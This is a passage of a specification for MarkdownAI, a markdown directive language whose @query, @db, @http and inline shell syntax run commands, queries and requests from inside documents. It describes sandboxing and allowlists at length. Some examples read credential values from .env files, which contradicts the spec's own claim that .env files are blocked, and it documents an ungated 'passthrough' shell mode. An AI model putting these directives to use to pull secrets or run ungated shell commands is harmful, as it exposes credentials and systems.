@read ./package.json path="version"
@read ./package.json path="name"
@read ./config.yaml path="database.host"
@read ./coverage/summary.json path="total.lines.pct"
@read ./config.json path="servers[0].host"
@read ./package.json path="scripts.build"
```

Single values resolve inline. `path` is dot-notation for nested structures. Array indices use `[n]` notation.

**Reading from `.env` files -- use `key` not `path`:**

`.env` files are flat key=value stores -- they have no nesting, no dot-notation paths. Use `key` to specify which variable to read:

```
@read ./.env.production key="API_URL"
@read ./.env.staging key="DATABASE_HOST"
@read ./.env key="STRIPE_PUBLISHABLE_KEY"
```

Using `path` on a `.env` file is a parse error:

```
ERROR: Invalid option for .env file

  File:    ./.env.production
  Option:  path="API_URL"
  Problem: .env files are flat key=value -- use key="API_URL" instead
```

**Used inline -- use `{{ }}`:**

```
# {{ read ./package.json path="name" }}
Version {{ read ./package.json path="version" }} -- built {{ date }}
Coverage: {{ read ./coverage/summary.json path="total.lines.pct" }}%
```

For inline prose use, always use `{{ read }}` interpolation syntax. Single scalar values only -- array and table data requires `@render` or piping.

**JSON array -- render as table:**

```
@read ./data/users.json as="table"
@read ./data/products.json path="items" as="table"
@read ./data/products.json path="items" columns="name:Product,price:Price,stock:Stock" as="table"
@read ./data/products.json path="items" where="stock>0" columns="name:Product,price:Price" as="table"
```

**JSON array -- pipe for transforms:**

```
@read ./data/products.json | sort | head -n 10 | @render type="table"
@read ./data/errors.json path="items" | grep "critical" | @render type="list"
```

**CSV file -- render as table:**

```
@read ./data/users.csv as="table"
@read ./data/users.csv columns="first_name:Name,email:Email,role:Role" as="table"
@read ./data/users.csv columns="name:Name,email:Email" where="role==admin" as="table"
@read ./data/products.csv columns="name:Product,price:Price" where="stock>0" as="table"
@read ./data/sales.csv columns="month:Month,revenue:Revenue,growth:Growth%" as="bar"
```

**CSV file -- pipe for transforms:**

```
@read ./data/report.csv skip=1 | sort -t',' -k2 -rn | head -n 5 | @render type="table"
@read ./data/products.csv | grep "active" | @render type="table"
```

**Single CSV column -- one value per line:**

```
@read ./data/users.csv column="email" | @render type="list"
@read ./data/products.csv column="name" | sort | @render type="numbered"
```

**`columns` syntax -- `key:Display Name`:**

```
columns="name"                           # keep original name
columns="first_name:Name"               # rename header
columns="name,email:Email,role:Role"    # mix
```

Source key on the left. Display name on the right. `:Display Name` is optional.

**`where` -- row filtering:**

`where` accepts the full MarkdownAI expression system. The left-hand side is a field name or dot-notation path. All JS/bash operators are valid -- `&&`, `||`, `!`, `?.`, `??`, `()` grouping.

```
where="role==admin"
where="stock>0"
where="status!=inactive"
where="price>=100"
where="role==admin && active==true"
where="role==admin || role==editor"
where="address?.country==US"
where="deletedAt==null"
where="(price>=100 && stock>0) || featured==true"
```

See the `@if` section for the full operator reference. Same operators, field name on the left instead of env var.

**Supported file types:**

| Extension | Access Option | Supported Operations |
|---|---|---|
| `.json` | `path="dot.notation"` | Single value, array as table, object keys/values |
| `.yaml`, `.yml` | `path="dot.notation"` | Single value, array as table, object keys/values |
| `.toml` | `path="dot.notation"` | Single value, array as table, object keys/values |
| `.csv` | `column="name"` | Full table, single column, filtered rows |
| `.env` | `key="KEY_NAME"` | Single key value only -- no arrays, no nesting |

`path` is only valid on JSON, YAML, and TOML. `column` is only valid on CSV. `key` is only valid on `.env`. Using the wrong access option for a file type is a parse error.

**Security:** `@read` is subject to document root confinement and content masking. Absolute paths and traversal above the document root are always blocked. File content is scanned for sensitive patterns and masked before output. `.env` files and credential files matching built-in exclusion patterns are blocked. See the Filesystem Security section.

**All options:**

| Option | Applies to | Description |
|---|---|---|
| `path` | JSON, YAML, TOML | Dot-notation selector for nested values |
| `key` | `.env` | Key name to read -- flat lookup only |
| `column` | CSV | Single column name, outputs one value per line |
| `columns` | JSON, CSV | `key:Name,...` -- select and rename fields, dot-notation supported |
| `where` | JSON, CSV | Row filter expression -- full expression system |
| `skip` | CSV | Header rows to skip |
| `collapse` | JSON, YAML, TOML | `true` -- stringify nested objects/arrays inline |
| `as` | All | Shorthand for `\| @render type="..."` |

---

#### `@query` -- Shell Command

Executes a shell command and captures stdout.

```
@query "git log --oneline -10"
@query "git log --pretty=format:'- %s' --since='last month'"
@query "npm audit --json | jq '.metadata.vulnerabilities'"
@query "grep -r 'TODO' ./src/ --include='*.ts' -l"
@query "wc -l ./src/**/*.ts | tail -n 1"
@query "cat ./CHANGELOG.md | head -n 20"
```

`@query` is the universal escape hatch. Anything expressible as a shell command becomes a markdown directive. The spec never needs updating for use cases that can be expressed in the shell.

**Security:** `@query` is a jailed directive. It is stripped by default on all commands. Execution requires explicit configuration in `~/.markdownai/security.json` with an allowlist of permitted command patterns. See the Security section for the complete threat model, execution pipeline, and configuration reference. Never enable shell execution for untrusted documents.

---

#### `@db` -- Database Query

Executes a database query against a connection and returns structured results. Output flows into `@render` or Linux pipe stages -- never into another source directive.

**Single connection -- `using` optional:**

```
@connect db type="mongodb" uri=env.MONGODB_URI

@db query="db.users.countDocuments()" 
@db query="db.users.find({active:true})" as="table"
```

**Named connections -- `using` required:**

```
@db using="primary" query="db.users.find()" as="table"
@db using="analytics" query="SELECT * FROM events WHERE date > NOW() - INTERVAL '7 days'" as="table"
```

**Inline connection -- no `@connect` needed:**

```
@db uri=env.MONGODB_URI query="db.users.find()" as="table"
@db uri=env.POSTGRES_URI query="SELECT * FROM users" as="table"
```

**Column selection and renaming:**

```
@db query="db.users.find()" columns="name:Name,email:Email,role:Role" as="table"
@db using="analytics" query="SELECT * FROM events" columns="ts:Timestamp,msg:Message,level:Level" as="table"
```

**Row filtering:**

```
@db query="db.users.find()" where="role==admin" columns="name:Name,email:Email" as="table"
```

Note: `where` on `@db` is a post-query filter applied to results. For database-level filtering, include conditions in the query itself for performance. `where` accepts the full MarkdownAI expression system -- see the `@if` section for the complete operator reference.

**Pipe for transforms:**

```
@db query="db.products.find()" | grep "active" | sort | head -n 10 | @render type="table"
@db using="analytics" query="SELECT name, count FROM errors" | sort -t'|' -k2 -rn | @render type="bar"
```

**MongoDB syntax** is supported natively. No SQL translation required for MongoDB connections.

**Output:** Structured data -- one row per line, suitable for piping into Linux commands or `@render`. Never piped into another source directive.

**Security:** `@db` is a jailed directive. It is stripped by default. Execution requires the connection to be configured in `~/.markdownai/security.json` with operation allowlists, denied keywords, collection restrictions, and `readonly` enforcement. Queries are sanitized before execution -- multiple statements, DDL operations, and write operations are blocked unless explicitly permitted. See the Security section for the complete threat model and configuration reference.

**All options:**

| Option | Description |
|---|---|
| `using` | Named connection from `@connect` |
| `uri` | Inline connection string via env var |
| `query` | Database query -- SQL or MongoDB syntax |
| `columns` | `key:Name,key2:Name2` -- select and rename fields |
| `where` | Post-query row filter -- full expression system, field name on left-hand side |
| `as` | Shorthand for `\| @render type="..."` |

---

#### `@http` -- HTTP Request

Makes an HTTP request and returns the response or a value extracted from it. Output is pipeable like all source directives.

**Basic usage:**

```
@http url="https://api.github.com/repos/thedecipherist/markdownai" path="stargazers_count"
@http url=env.METRICS_API path="data.users.total"
@http url="https://api.npmjs.org/downloads/point/last-month/markdownai" path="downloads"
@http url=env.STATUS_API path="status" as="inline"
```

**With headers:**

```
@http url=env.PRIVATE_API path="data" headers="Authorization=env.API_TOKEN"
@http url=env.API_URL headers="Authorization=env.TOKEN,X-Version=env.API_VERSION,Accept=application/json"
```

Headers are comma-separated `Key=value` pairs. Values referencing env vars use `env.VAR` notation. Literal credential values in headers are blocked by the masking system -- always reference credentials via env vars.

**POST requests:**

```
@http url=env.API_URL method="POST" body='{"filter":"active","limit":100}' path="data.items" as="table"
@http url=env.SEARCH_API method="POST" body='{"query":"markdownai"}' path="results"
```

`method` defaults to `GET`. POST, PUT, DELETE require explicit permission in `~/.markdownai/security.json`. `body` is only valid when `method` is not `GET`.

**Timeout:**

```
@http url=env.SLOW_API path="data" timeout=10000
```

Overrides the security config default timeout for this specific request.

**JSON array response -- structured rendering:**

When the response or selected `path` is a JSON array, `columns`, `where`, and `as` apply directly:

```
@http url=env.ITEMS_API path="items" columns="name:Name,price:Price,stock:Stock" as="table"
@http url=env.USERS_API path="data" where="role==admin" columns="name:Name,email:Email" as="table"
@http url=env.PRODUCTS_API | jq '.items[] | select(.active)' | @render type="table"
```

**Response handling:**

| Response type | Behavior |
|---|---|
| JSON object | `path` selector extracts value or whole object |
| JSON array | `columns`, `where`, `as` apply directly |
| Plain text | Returned as-is, pipeable |
| Non-200 status | Empty string, WARN logged; `--strict` makes it an error |
| Timeout | Empty string, ERROR logged; `--strict` makes it an error |

**All options:**

| Option | Description | Default |
|---|---|---|
| `url` | Request URL -- literal string or `env.VAR` reference | required |
| `path` | Dot-notation selector into JSON response | none -- full response |
| `method` | HTTP method | `GET` |
| `body` | Request body for POST/PUT -- JSON string | none |
| `headers` | `Key=env.VAR,Key2=value` comma-separated pairs | none |
| `timeout` | Timeout in milliseconds | security config value |
| `columns` | `key:Name,...` -- select and rename from JSON array response | all |
| `where` | Row filter on JSON array -- full expression system | none |
| `as` | Shorthand for `\| @render type="..."` | none |

**Security:** `@http` is a jailed directive. Stripped by default. Requires domain allowlisting in `~/.markdownai/security.json`. Internal network addresses, cloud metadata endpoints, and private IP ranges are always blocked. Only `GET` permitted unless explicitly configured. `body` only valid when `method` is non-GET and non-GET methods are explicitly allowed. See the Security section.

---

#### `@tree` -- Directory Tree

Renders a directory structure as an ASCII tree.

```
@tree ./src/
@tree ./src/ depth=2
@tree ./docs/ match="*.md"
@tree ./src/ as="code"
```

**Options:**

| Option | Description | Default |
|---|---|---|
| `depth` | Maximum directory depth | unlimited |
| `match` | Filename filter glob | `*` |
| `as` | Shorthand for `\| @render type="..."` -- typically `code` or `list` | none |

**Output:** ASCII tree suitable for piping or direct rendering.

```
src/
├── controllers/
│   ├── auth.ts
│   └── users.ts
├── models/
│   └── user.ts
└── index.ts
```

---

#### `@date` -- Date and Time

Inserts a date value. Resolves to the current date, or the last-modified date of a specific file.

```
@date
@date format="YYYY"
@date format="YYYY-MM-DD"
@date file="./src/index.ts" type="modified"
@date file="./CHANGELOG.md" type="modified"
```

**Options:**

| Option | Description | Default |
|---|---|---|
| `format` | Date format string | `YYYY-MM-DD` |
| `file` | Path to file for `modified` type | none -- current time |
| `type` | `modified` or `current` | `current` |

**`type="created"` is not supported.** Linux filesystems do not reliably store file creation time -- `ctime` on Linux is the inode change time, not creation time. To avoid silent incorrect values on the most common deployment platform, `created` is not a valid option.

**Getting creation date via git (reliable cross-platform):**

The date a file was first committed to git is the reliable equivalent of creation date:

```
First committed: @query "git log --follow --format=%aI --diff-filter=A -- ./src/index.ts | tail -1" @cache session
```

**Format string tokens:**

| Token | Output |
|---|---|
| `YYYY` | Full year e.g. `2025` |
| `MM` | Month e.g. `01`-`12` |
| `DD` | Day e.g. `01`-`31` |
| `HH` | Hour 24h e.g. `00`-`23` |
| `mm` | Minutes e.g. `00`-`59` |
| `ss` | Seconds e.g. `00`-`59` |

**Used inline -- use `{{ }}`:**

```
Last updated: {{ date }}
© {{ date format="YYYY" }} {{ env.COMPANY_NAME }}
Built {{ date format="YYYY-MM-DD" }} from {{ read ./package.json path="version" }}
Last modified: {{ date file="./src/index.ts" type="modified" format="YYYY-MM-DD" }}
```

For inline prose use, always use `{{ date }}` interpolation syntax.

---

#### `@count` -- Count Filesystem Items

Counts files or directories matching a glob pattern and returns a number. **Filesystem only** -- `@count` is the inline scalar companion to `@list` for filesystem sources.

```
@count ./src/ match="**/*.ts"
@count ./docs/ match="*.md"
@count ./src/ match="**/" type="dirs"
```

**Options:**

| Option | Description | Default |
|---|---|---|
| `match` | Glob pattern | `*` |
| `type` | `files`, `dirs`, `both` | `files` |

**Used inline -- use `{{ }}`:**

```
This project contains {{ count ./src/ match="**/*.ts" }} TypeScript files
across {{ count ./src/ match="**/" type="dirs" }} directories.
```

For inline prose use, always use `{{ count }}` interpolation syntax.

**Counting non-filesystem sources -- use the pipe operator:**

For counting items in JSON arrays, CSV files, or database results, pipe through `wc -l`:

```
This system manages {{ read ./data/users.json path="users" | wc -l }} users.
This report covers {{ list ./data/products.csv | wc -l }} products.
Database has {{ db query="db.users.find()" | wc -l }} users.
```

The pipe approach is more composable and works consistently across all source types.

---

### The Pipe Operator

MarkdownAI follows the Unix philosophy. Source directive output is plain text, one item per line. Pipe stages transform the output. `@render` is the output sink.

```
@list ./src/ match="**/*.ts" | sort | @render type="list"
@list ./docs/ match="*.md" | grep "phase-" | @render type="numbered"
@list ./src/ | grep -v "test" | wc -l
@db using="analytics" query="SELECT name, stars FROM repos ORDER BY stars DESC" | head -n 10 | @render type="table"
@query "git log --oneline -20" | grep "fix:" | @render type="list"
@read ./package.json path="dependencies" | sort | @render type="list"
@list ./src/ match="**/*.ts" | xargs wc -l | sort -rn | head -n 10 | @render type="table"
```

**Pipe chain parsing rule:**

A line beginning with `@` that contains an unquoted `|` character is parsed as a single `pipe` node -- not as the individual source directive. The entire line is one compound expression. This is the only case where multiple `@` tokens appear on one line and is an explicit parser exception to the one-directive-per-line rule.

The pipe node structure:

```typescript
interface PipeNode {
  type: "pipe"
  stages: PipeStage[]
}

type PipeStage =
  | { type: "source"; node: ASTNode }      // @list, @read, @db etc -- always stage 0
  | { type: "builtin"; command: string }    // cross-platform built-in commands
  | { type: "shell"; command: string }      // Unix/WSL shell commands
  | { type: "sink"; node: RenderNode }      // @render -- final stage
  | { type: "scalar" }                      // wc -l with no @render -- bare number output
```

**`@render` is the pipe sink token.** It is only valid as the final stage of a pipe chain. It never appears as a standalone line directive. Its presence at the end of a pipe does not violate the one-directive-per-line rule because the pipe is one expression.

**Quoted string boundary rule:**

A `|` inside a quoted string is never a pipe separator:

```
@db query="SELECT name | count FROM errors" | @render type="table"
```

The `|` inside `"..."` is part of the query string. The `|` outside is the pipe separator. The parser splits on unquoted `|` only.

---

**Cross-platform built-in pipe commands:**

These commands are implemented natively in Node.js by the MarkdownAI engine. They work on all platforms -- Linux, macOS, and Windows -- without requiring WSL or any shell.

| Command | Description |
|---|---|
| `grep <pattern>` | Keep lines matching pattern |
| `grep -v <pattern>` | Keep lines NOT matching pattern |
| `grep -i <pattern>` | Case-insensitive match |
| `sort` | Sort lines alphabetically |
| `sort -r` | Sort reverse alphabetically |
| `sort -n` | Sort numerically |
| `sort -rn` | Sort numerically, reversed |
| `head -n N` | First N lines |
| `tail -n N` | Last N lines |
| `wc -l` | Count lines -- outputs a number |
| `uniq` | Remove consecutive duplicate lines |

These cover the vast majority of real MarkdownAI pipe use cases.

**Shell-dependent pipe commands (Unix, macOS, WSL only):**

These commands invoke a Unix shell process. They are not available on Windows without WSL.

```
awk, sed, cut, xargs, tr, jq, and all other shell utilities
```

**Platform behavior:**

| Platform | Built-in commands | Shell commands |
|---|---|---|
| Linux | ✓ Works | ✓ Works |
| macOS | ✓ Works | ✓ Works |
| Windows + WSL | ✓ Works | ✓ Works (via WSL) |
| Windows (native) | ✓ Works | ✗ Fails |

**`mai validate` warns on Windows when shell-dependent commands are detected:**

```
⚠ Shell-dependent pipe command detected: "jq '.items[]'"
  This command requires Unix/WSL and will fail on Windows without WSL.
  Consider using @read with path= for JSON extraction instead.
```

**The engine detects the execution platform at startup.** On Windows without a detectable WSL environment, shell-dependent pipe stages are stripped with a WARN rather than causing a runtime crash.

**Multi-pipe:**

```
@list ./src/ match="**/*.ts" | grep -v "\.test\." | grep -v "\.spec\." | sort | @render type="numbered"
```

**Pipe into scalar -- no `@render` needed:**

```
@list ./src/ match="**/*.ts" | grep -v test | wc -l
```

Produces a bare number. Used inline as a scalar value. When the final stage is a pipe command rather than `@render`, the output is treated as a scalar string and inlined directly.

---

### `@render` -- Output Sink

Consumes piped input and renders it as markdown. **`@render` is the pipe sink token.** It only appears as the final stage of a pipe chain -- never as a standalone line directive. The entire pipe chain including `@render` is parsed as a single `pipe` node.

```
@list ./docs/ match="*.md" | @render type="list"
@list ./docs/ match="*.md" | @render type="numbered"
@list ./docs/ match="*.md" | @render type="links"
@db query="SELECT name, role, joined FROM users" | @render type="table"
@tree ./src/ | @render type="code"
@db using="analytics" query="SELECT month, revenue FROM sales" | @render type="bar"
@list ./phases/ match="*.md" | @render type="flow"
@query "git log --oneline -10" | @render type="list"
@read ./data/config.json | @render type="tree"
@read ./data/config.json path="database" | @render type="json"
```

**Render types:**

| Type | Output | Best for |
|---|---|---|
| `list` | Markdown unordered list | File names, items |
| `numbered` | Markdown ordered list | Ranked items, steps |
| `links` | Markdown links list | Files with clickable paths |
| `table` | Markdown table | Structured data, query results |
| `code` | Fenced code block | Command output, raw text |
| `inline` | Plain text inline | Single scalar values |
| `bar` | ASCII horizontal bar chart | Numeric comparisons |
| `flow` | ASCII flow diagram | Phase relationships, pipelines |
| `tree` | ASCII indented tree | Nested structures, hierarchies |
| `timeline` | ASCII timeline | Sequential phases, events |
| `json` | Pretty-printed fenced JSON block | Raw JSON structure display |

---

**Nested JSON rendering:**

Nested JSON objects require a deliberate choice about how to handle depth. Four strategies are available depending on the use case.

**Strategy 1 -- dot-notation column selection (recommended for tables):**

Select specific nested fields using dot-notation in `columns`. Nesting is resolved at selection time. Output is a clean flat table.

```
@read ./data/users.json columns="name:Name,address.city:City,address.country:Country,roles[0]:Primary Role" as="table"
```

Output:

```
| Name | City     | Country | Primary Role |
|------|----------|---------|--------------|
| Tim  | New York | US      | admin        |
```

Works on `@read`, `@list`, and `@db` -- any source that produces structured data.

**Strategy 2 -- `collapse=true` (stringify nested values inline):**

Nested objects become `key=value, key=value` strings. Arrays become comma-separated. Keeps all data visible in a flat table without losing fields.

```
@read ./data/users.json columns="name:Name,address:Address,roles:Roles" collapse=true as="table"
```

Output:

```
| Name | Address                    | Roles         |
|------|----------------------------|---------------|
| Tim  | city=New York, country=US  | admin, editor |
```

**Strategy 3 -- `@render type="tree"` (hierarchy preserved as ASCII tree):**

Renders nested JSON as an indented ASCII tree. Best for config files, deeply nested structures, anything where the hierarchy matters more than tabular comparison.

```
@read ./data/users.json | @render type="tree"
```

Output:

```
users
└── [0]
    ├── name: Tim
    ├── address
    │   ├── city: New York
    │   └── country: US
    └── roles
        ├── [0]: admin
        └── [1]: editor
```

**Strategy 4 -- `@render type="json"` (pretty-printed code block):**

Renders the raw JSON structure as a fenced code block with syntax highlighting. Best for showing config values, API responses, or any structure where exact formatting matters.

```
@read ./data/config.json path="database" | @render type="json"
```

Output:

````
```json
{
  "host": "localhost",
  "port": 27017,
  "name": "mydb",
  "options": {
    "poolSize": 10,
    "ssl": true
  }
}
```
````

**Strategy 5 -- `jq` pipe (full JSON reshaping):**

For complex transformations, `jq` is available as a pipe stage. Full `jq` query language for extracting, reshaping, and filtering nested structures. The spec never needs updating for complex JSON cases -- `jq` handles them.

```
@read ./data/users.json | jq '.[] | {name, city: .address.city, role: .roles[0]}' | @render type="table"
@http url=env.API_URL | jq '.data.items[] | {id, name, status}' | @render type="table"
@db query="db.orders.find()" | jq '.[] | {id: ._id, total: .items | map(.price) | add}' | @render type="table"
```

**Choosing a strategy:**

| Scenario | Strategy |
|---|---|
| Want specific nested fields as a flat table | dot-notation `columns="address.city:City"` |
| Want all fields visible including nested | `collapse=true as="table"` |
| Want to see full JSON hierarchy | `as="tree"` or `\| @render type="tree"` |
| Want raw JSON displayed cleanly | `as="json"` or `\| @render type="json"` |
| Complex reshaping or multi-level extraction | pipe through `jq` |

---

**ASCII chart rendering:**

All chart types render as ASCII -- not Mermaid, not images. ASCII renders everywhere: terminals, AI context windows, email, any plain text viewer. No renderer required. No dependencies.

```
@db using="analytics" query="SELECT name, count FROM top_errors ORDER BY count DESC LIMIT 5" | @render type="bar"
```

Output:

```
auth_failure    ████████████████████ 847
timeout         █████████████ 534
rate_limit      ████████ 312
not_found       █████ 201
validation      ███ 98
```

```
@list ./phases/ match="phase-*.md" | @render type="flow"
```

Output:

```
phase-init ──► phase-plan ──► phase-build ──► phase-test ──► phase-deploy
```

**The `@graph` block generates Mermaid for human-rendered documentation. `@render type="flow"` generates ASCII for AI context and terminal output. Same data, optimized for different consumers.**

---

### `@if`, `@elseif`, `@else`, and `@endif` -- Conditional Blocks

Renders a block of content only if a condition is true. Supports unlimited `@elseif` branches and an optional `@else` fallback.

**This section defines the MarkdownAI expression system.** The same operators, syntax, and rules apply everywhere expressions are used in the spec -- `@if` conditions, `where` clauses on `@list`/`@read`/`@db`, `{{ }}` interpolation expressions, and `@include`/`@import` conditional expressions. The only difference across contexts is what the left-hand side refers to: env vars in `@if`, field names in `where`, resolved values in `{{ }}`.

**Expression syntax follows JavaScript and bash operators.** If it is valid in JS or bash, it is valid in a MarkdownAI expression. No new syntax to learn. Developers already know both.

**Simple conditional:**

```
@if env.NODE_ENV == "development"
> **Development mode** -- debug logging is enabled.
@endif
```

**With `@else`:**

```
@if env.NODE_ENV == "production"
This is the production deployment guide.
@else
This is the development setup guide.
@endif
```

**With `@elseif`:**

```
@if env.TIER == "enterprise"
@include ./sections/enterprise.md
@elseif env.TIER == "pro"
@include ./sections/pro.md
@elseif env.TIER == "team"
@include ./sections/team.md
@else
@include ./sections/free.md
@endif
```

Branches are evaluated top to bottom. The first condition that evaluates to true is rendered. All other branches are skipped. If no condition is true and `@else` is present, the `@else` block renders.

**Logical operators:**

```
@if env.NODE_ENV == "development" || env.DEBUG == "true"
> Debug panel enabled.
@endif

@if env.NODE_ENV == "production" && env.REGION == "us"
@include ./sections/us-production.md
@endif

@if (env.TIER == "enterprise" || env.TIER == "pro") && env.REGION == "us"
@include ./sections/us-premium.md
@endif
```

**Ternary `? :`**

Inline conditional resolving to one of two values. Valid inside `{{ }}` interpolation and in `@if` condition expressions. Directive arguments are always static strings -- dynamic path or file selection uses `@if` blocks, not ternary.

**Valid -- inside `{{ }}` interpolation:**

```
Environment: {{ env.NODE_ENV == "production" ? "Production" : "Development" }}
API: {{ env.NODE_ENV == "production" ? env.PROD_API : env.DEV_API }}
```

**Valid -- dynamic file selection uses `@if` blocks:**

```
@if env.NODE_ENV == "production"
@read ./config/prod.json path="database.host"
@else
@read ./config/dev.json path="database.host"
@endif

@if env.TIER == "enterprise"
@include ./sections/enterprise.md
@else
@include ./sections/standard.md
@endif
```

**Invalid -- ternary cannot be used as a directive argument:**

```
@read @if env.NODE_ENV == "production" ? "./config/prod.json" : "./config/dev.json"  ← INVALID
@include @if env.TIER == "enterprise" ? "./enterprise.md" : "./standard.md"           ← INVALID
```

The parser sees `@read` or `@include` as the directive and `@if` as part of its argument string. Two directives cannot appear on one line.

**Optional chaining `?.`**

Safely navigates nested structures. Returns empty string instead of error if any part of the path does not exist:

```
@read ./config.json path="database?.host"
@read ./config.json path="servers?.[0]?.host"
@read ./data/users.json path="users?.[0]?.address?.city"
@read ./package.json path="scripts?.build"
```

In `columns` dot-notation:

```
@read ./data/users.json columns="address?.city:City,address?.country:Country" as="table"
@list ./data/orders.json path="items" columns="product?.name:Product,product?.price:Price" as="table"
```

**Nullish coalescing `??`**

Returns the right side only if the left side is null or undefined. Safer than `||` for numeric and boolean values where `0` or empty string are valid:

```
@read ./config.json path="database?.port" ?? "27017"
@env API_VERSION ?? "v1"
@read ./package.json path="config?.timeout" ?? "30"
```

Difference from `||`:

```
@env PORT || "3000"    # returns "3000" if PORT is empty string, 0, or unset
@env PORT ?? "3000"    # returns "3000" only if PORT is null or unset
```

**Fallback chaining with `||`**

Try each value until one resolves:

```
@env API_URL || env.FALLBACK_URL || "http://localhost:3000"
```

**File and directory existence:**

Three boolean functions that plug into the expression system. Negation via `!`. All operators apply.

```
file.exists "./path"    -- true if path exists (file or directory)
file.isFile "./path"    -- true if path exists AND is a file
file.isDir "./path"     -- true if path exists AND is a directory
```

**Simple existence checks:**

```
@if file.exists "./src/enterprise/"
@include ./sections/enterprise-setup.md
@elseif file.exists "./src/pro/"
@include ./sections/pro-setup.md
@else
@include ./sections/standard-setup.md
@endif
```

**Negation with `!`:**

```
@if !file.exists "./.env.production"
> Warning: .env.production not found -- using defaults.
@endif

@if !file.isDir "./src/enterprise/"
@include ./sections/standard-setup.md
@endif
```

**File vs directory distinction:**

```
@if file.isFile "./config/prod.json"
@read ./config/prod.json path="database.host"
@endif

@if file.isDir "./src/enterprise/"
@include ./sections/enterprise-setup.md
@endif
```

**Combined with `&&`, `||`, and the full expression system:**

```
@if file.exists "./config/prod.json" && file.exists "./config/secrets.json"
@include ./sections/secure-setup.md
@endif

@if file.isDir "./enterprise/" || file.isDir "./pro/"
@include ./sections/premium-features.md
@endif

@if file.isDir "./src/" && !file.exists "./src/legacy/"
@include ./sections/modern-setup.md
@endif

@if env.NODE_ENV == "production" && file.exists "./.env.production"
@read ./.env.production key="DATABASE_URL"
@endif
```

**Ternary in `{{ }}` interpolation:**

```
Config: {{ file.exists "./config/prod.json" ? "production" : "development" }}
```

**`mai eval` for testing:**

```bash
mai eval "file.exists './src/enterprise/'"
mai eval "file.isFile './config/prod.json'"
mai eval "!file.isDir './src/legacy/'"
```

**Nesting:**

```
@if env.NODE_ENV == "production"
  @if env.REGION == "us"
  @include ./sections/us-production.md
  @else
  @include ./sections/global-production.md
  @endif
@endif
```

**Full operator reference:**

| Operator | Source | Type | Usage |
|---|---|---|---|
| `==` | JS + bash | Equality | `env.X == "value"` |
| `!=` | JS + bash | Inequality | `env.X != "value"` |
| `>` `<` `>=` `<=` | JS + bash | Comparison | `env.PORT > 3000` |
| `&&` | JS + bash | Logical AND | `condition && condition` |
| `\|\|` | JS + bash | Logical OR / fallback | `condition \|\| condition` |
| `!` | JS + bash | Logical NOT | `!env.DISABLE_FEATURE`, `!file.exists "./path"` |
| `? :` | JS | Ternary | `condition ? "a" : "b"` |
| `?.` | JS | Optional chain | `path?.nested?.key` |
| `??` | JS | Nullish coalesce | `value ?? "default"` |
| `()` | JS + bash | Grouping | `(a \|\| b) && c` |
| `file.exists` | MarkdownAI | File/dir exists | `file.exists "./path"` |
| `file.isFile` | MarkdownAI | Exists and is a file | `file.isFile "./config.json"` |
| `file.isDir` | MarkdownAI | Exists and is a directory | `file.isDir "./src/enterprise/"` |

**The rule:** If it is valid JavaScript or bash, it is valid in a MarkdownAI expression. No exceptions, no special cases, no MarkdownAI-specific operator syntax to learn.

**What the stripper does:** Evaluates conditions against the current environment. Renders the matching branch. Removes all directive tags. See the Stripper section for the full behavior table covering unset variables and the `--env` flag requirement.

**Claude Code skill context variables:**

When a MarkdownAI document is executed as a Claude Code slash command skill (via the MCP `read_file` tool with `skill_args` and related fields), all Claude Code invocation variables are available in every `@if` condition and `{{ }}` interpolation expression:

| Variable | Source field | Description |
|---|---|---|
| `ARGUMENTS` / `args` | `skill_args` | Full raw argument string passed to the slash command |
| `argsList` | `skill_args` (parsed) | Positional argument array — shell-style, handles quoted strings |
| `arg0` `arg1` `arg2` `arg3` | `skill_args` (parsed) | Shorthand for `argsList[0]` through `argsList[3]` |
| `CLAUDE_SESSION_ID` | `skill_session_id` | Session ID from `${CLAUDE_SESSION_ID}` |
| `CLAUDE_EFFORT` | `skill_effort` | Effort level: `low`, `medium`, `high`, `xhigh`, or `max` |
| `CLAUDE_SKILL_DIR` | `skill_dir` | Directory containing the skill file (`${CLAUDE_SKILL_DIR}`) |
| Named args | `skill_named_args` | Each key from the skill frontmatter `arguments:` list spread into root scope |

**Syntax sugar for `$ARGUMENTS`:**

The preprocessor converts Claude Code variable syntax before expression evaluation:

```
$ARGUMENTS        →  ARGUMENTS
$ARGUMENTS[N]     →  argsList[N]
$N  (digit)       →  argsList[N]
```

This means both `ARGUMENTS.startsWith("audit")` and `$ARGUMENTS.startsWith("audit")` are valid.

**Skill dispatch pattern** — the canonical use case:

```
@markdownai
---
description: My workflow skill
---

@import ./shared.md

@if ARGUMENTS.startsWith("audit")
@include ./mdd-audit.md
@elseif ARGUMENTS.startsWith("status")
@include ./mdd-manage.md
@elseif ARGUMENTS === ""
Ask the user what they want to do.
@else
@include ./mdd-build.md
@endif
```

**Effort-gated content:**

```
@if CLAUDE_EFFORT == "max" || CLAUDE_EFFORT == "xhigh"
@include ./sections/deep-analysis.md
@else
@include ./sections/standard-analysis.md
@endif
```

**Named argument access** — if the skill frontmatter declares `arguments: [issue, branch]`, those names are available directly:

```
@if issue !== "" && branch !== ""
Working on issue {{ issue }} in branch {{ branch }}.
@endif
```

**Positional argument shorthand:**

```
@if arg0 == "dry-run"
This is a preview run only. No files will be modified.
@endif

First argument: {{ arg0 }}
Second argument: {{ arg1 }}
```

**Shell inline — `!`command`` interception:**

Claude Code skill files support `` !`command` `` as a native shell injection syntax. In a `@markdownai` document, MarkdownAI intercepts this syntax at the parser level and routes it through the same security gates as `@query`.

```
Current branch: !`git branch --show-current`
Files changed:  !`git diff --stat | wc -l`
```

Output replaces the tag inline. Multi-line output is trimmed and inlined at the substitution point.

**Security behaviour:**

| `allowShell` setting | Result |
|---|---|
| `false` (default) | Command blocked. Warning emitted. Empty string substituted. |
| `true` | Command runs through deny-pattern check and jailRoot confinement. Output substituted. |

The same `ShellSecurityConfig` deny patterns, jailRoot confinement, and immutable block rules that gate `@query` apply here. A `@markdownai` document cannot be used as a vector for ungated shell execution even when an author uses the Claude Code syntax.

Plain inline code spans (`` `code` ``) are never treated as shell inline — the `!` prefix is required.

Fenced code blocks are immune: `` !`command` `` inside a fenced block is emitted as raw text, never evaluated.

**Opt out with `shell-inline="passthrough"`:**

```
@markdownai shell-inline="passthrough"
```

With `passthrough`, the parser leaves all `` !`command` `` patterns as raw text. Claude Code's own evaluation handles them. No MarkdownAI security gates apply. This is a deliberate escape hatch — the name is "passthrough" not "disable" to make explicit that you are handing control to an unsecured mechanism.

**Comparison with `@query`:**

| | `@query` | `` !`command` `` via MarkdownAI | `` !`command` `` via Claude Code |
|---|---|---|---|
| Security gated | Yes | Yes (same gates) | No |
| Works outside Claude Code skills | Yes | Yes | No |
